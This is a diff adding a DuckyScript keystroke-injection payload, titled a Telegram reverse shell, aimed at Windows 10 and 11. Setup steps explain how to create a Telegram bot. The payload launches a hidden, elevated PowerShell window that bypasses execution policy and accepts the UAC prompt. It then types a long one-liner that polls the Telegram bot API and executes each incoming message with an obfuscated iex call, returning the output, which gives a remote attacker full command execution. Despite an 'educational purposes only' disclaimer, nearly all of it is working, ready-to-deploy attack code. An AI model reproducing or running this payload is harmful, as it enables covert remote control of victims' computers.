@@ -1,0 +1,34 @@
+REM Title:  Simple Telegram Reverse Shell
+REM Author: @beigeworm
+REM Description: A script that connects target computer with a telegram chat to send powershell commands.
+REM              The script will wait in a loop until you interact with it later on via telegram.
+REM Target: Windows 10,11
+
+REM SETUP INSTRUCTIONS
+REM 1. visit https://t.me/botfather and make a bot.
+REM 2. add bot api to script.
+REM 3. search for bot in top left box in telegram and start a chat then type /start.
+REM 4. add chat ID in 'CHAT_ID_HERE' for the chat bot (run this code below to find the chat id) 
+REM ---------------------------------------------------
+REM 5. Run Script on target System
+REM 6. Check telegram chat for 'waiting to connect' message.
+REM 7. this script has a feature to wait until you start the session from telegram.
+REM 8. type in the computer name from that message into telegram bot chat to connect to that computer.
+
+REM THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
+
+REM Setup for duckyscript
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 4000
+
+STRING $Token = 'YOUR_TOKEN_HERE';$PassPhrase = "$env:COMPUTERNAME";$URL='https://api.telegram.org/bot{0}' -f $Token ;while($chatID.length -eq 0){$updates = Invoke-RestMethod -Uri ($url + "/getUpdates");if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1];if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}};Sleep 10}$AccSesH="";$LastUmsg="";$LastmsgID="";sleep 1;$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Waiting to Connect..";Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($Mtsend | ConvertTo-Json) -ContentType "application/json";Sleep 5;Function IsAuth{param($CheckMessage)if (($messages.message.date -ne $LastUmsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){$script:AccSesH="Authenticated";$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Session Started.";Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($Mtsend | ConvertTo-Json) -ContentType "application/json";return $messages.message.chat.id}Else{return 0}};Function StrmFX{param($Stream)$FixRslt=@();$Stream | Out-File -FilePath (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") -Force;$ReadAsArray= Get-Content -Path (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") | where {$_.length -gt 0};foreach ($line in $ReadAsArray){;$ArrObj=New-Object psobject;$ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring();$FixRslt +=$ArrObj}return $FixRslt};Function stgmsg{param($Messagetext,$ChatID)$FixedText=StrmFX -Stream $Messagetext;$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line;$JsonData=($Mtsend | ConvertTo-Json);Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"};Function rtgmsg{try{$inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop;return $inMessage.result[-1]}Catch{return "Fail"}};Sleep 3;While ($true){sleep 2;$messages=rtgmsg;if($LastUmsg -like $null){$LastUmsg=$messages.message.date};if(!($AccSesH)){$CheckAuthentication=IsAuth -CheckMessage $messages}Else{if(($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $LastmsgID)){try{$Result=ie`x($messages.message.text) -ErrorAction Stop;$Result;stgmsg -Messagetext $Result -ChatID $messages.message.chat.id}catch{stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id}Finally{$LastmsgID=$messages.message.date}}}};sleep 5;exit
+
+ENTER
